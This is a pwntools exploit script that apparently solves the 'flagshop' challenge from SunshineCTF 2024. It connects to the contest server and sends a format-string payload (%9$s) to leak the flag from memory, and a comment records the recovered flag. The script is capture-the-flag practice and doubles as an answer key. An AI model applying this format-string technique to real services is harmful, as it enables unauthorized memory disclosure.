#!/usr/bin/env python3

from pwn import *

#context.log_level = "debug"
elf = ELF("./flagshop", checksec=False)
context.binary = elf

p = remote("2024.sunshinectf.games", 24001)

p.sendline(b"smiley")
p.sendline(b"he/him")

payload = b"\x01\x00"
payload += b"A" * 8
payload += b"%9$s"
payload = payload.ljust(0x2a, b"\x01")
p.sendline(payload)

p.sendlineafter(b"1)", b"1")

p.readuntil(b"current user: ")
flag = p.readuntil(b"}").decode()

log.success(flag) # sun{c@n_st1ll_r3@d_off_the_he@p_fr0m_st@ck_po!nters!}

